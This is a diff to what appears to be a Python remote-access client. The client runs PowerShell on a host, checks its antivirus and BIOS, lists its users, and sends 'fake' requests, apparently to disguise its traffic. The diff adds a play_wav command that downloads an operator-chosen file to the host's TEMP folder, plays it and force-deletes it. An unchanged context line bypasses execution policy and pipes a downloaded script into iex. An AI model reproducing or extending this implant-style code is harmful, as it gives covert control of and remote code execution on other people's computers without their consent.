@@ -61,7 +61,9 @@ class Client:
             "get_bios":self.get_bios,
             "get_antivirus":self.get_antivirus,
             "get_active": self.get_active,
-            "install_choco": self.install_choco
+            "install_tools": self.install_tools,
+            "install_choco": self.install_choco,
+            "play_wav": self.play_wav,
         }
 
     def run_powershell_command(self, command: str, print_result: bool = True) -> None:
@@ -117,6 +119,27 @@ class Client:
         command = "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))"
         self.run_powershell_command(command)
 
+    def play_wav(self, command) -> None:
+        try:
+            remote_file = command.split(" ")[1]
+            duration = int(command.split(" ")[2])
+        except:
+            self.__send_fake_request()
+            return
+        out_file = "$env:TEMP\\tmpSound.wav"
+        print(f"[*] Downloading {remote_file}")
+        download_command = f'Invoke-WebRequest -URI {remote_file} -OutFile "{out_file}"'
+        self.run_powershell_command(download_command, print_result=False)
+        print(f"[*] Playing Audio")
+        play_command = f'(New-Object System.Media.SoundPlayer("{out_file}")).PlaySync()'
+        self.run_powershell_command(play_command, print_result=False)
+        time.sleep(duration + 1)
+        print("[*] Deleting Audio File")
+        delete_command = f'remove-item -Path "{out_file}" -Force'
+        self.run_powershell_command(delete_command, print_result=False)
+        
+
+
     def print_help(self, command = None):
         print("""
 Command         Description
@@ -131,6 +154,9 @@ get_tools        - Checks to see what tools are installed on the system
 get_file         - Downloads a remote file and saves it to your computer ... Syntax: get_file <REMOTE_FILE> <LOCAL_FILE>
 get_users        - Lists all users on the local computer
 get_choco        - Installs chocolatey --> https://chocolatey.org/ (Requires Admin)
+play_wav         - Plays a WAV file from a specified url (Stores WAV temporarly)
+                                    URL to fetch wav file                               Duration in seconds (use whole numbers)
+                   Syntax: play_wav https://www.soundjay.com/mechanical/chainsaw-01.wav 37 
     """)
         self.__send_fake_request()
 
